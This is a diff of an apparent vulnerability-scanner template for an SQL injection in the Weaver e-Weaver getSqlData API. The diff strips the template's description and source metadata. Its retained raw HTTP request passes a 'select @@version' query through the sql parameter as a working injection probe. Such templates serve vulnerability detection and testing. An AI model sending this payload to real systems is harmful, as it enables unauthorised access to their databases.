@@ -3,12 +3,8 @@ info:
   name: 泛微e-Weaver getSqlData SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/opxdafinv659l7e9'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: opxdafinv659l7e9
-    fofa: 暂无
 http:
 - raw:
   - 'GET /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version HTTP/1.1
